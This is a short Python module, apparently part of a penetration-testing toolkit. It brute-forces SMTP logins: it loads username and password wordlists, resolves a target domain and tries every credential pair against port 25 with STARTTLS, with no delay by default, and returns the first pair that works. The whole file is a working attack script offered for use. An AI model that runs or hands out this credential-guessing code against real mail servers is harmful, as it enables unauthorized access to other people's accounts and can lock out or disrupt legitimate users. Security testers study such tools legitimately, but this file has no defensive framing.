from __future__ import print_function
import os
import sys
import time
import socket
from time import sleep
import smtplib

smtpuser = []
smtppass = []

def smtpBrute0x00(ip, usernames, passwords, port, delay):

    s = smtplib.SMTP(str(ip), port)
    for username in usernames:
        for password in passwords:
            try:
                s.ehlo()
                s.starttls()
                s.ehlo()
                s.login(str(username), str(password))
                s.close()
                return username, password
            except smtplib.SMTPAuthenticationError:
                sleep(delay)
            except Exception as e:
                pass
            except KeyboardInterrupt:
                s.close()
                sys.exit(1)

def smtpbrute(web):


    try:
        with open('app/views/module/file/dict/brute/smtp/smtp_user.lst') as users:
            for user in users:
                user = user.strip('\n')
                smtpuser.append(user)
        with open('app/views/module/file/dict/brute/smtp/smtp_pass.lst') as passwd:
            for passw in passwd:
                passw = passw.strip('\n')
                smtppass.append(passw)
    except IOError:
        print(' [-] File paths not found!')

    web = web.replace('https://','')
    web = web.replace('http://','')
    ip = socket.gethostbyname(web)
    port = 25
    delay = 0
    username,password = smtpBrute0x00(ip, smtpuser, smtppass, port, delay)
    return username,password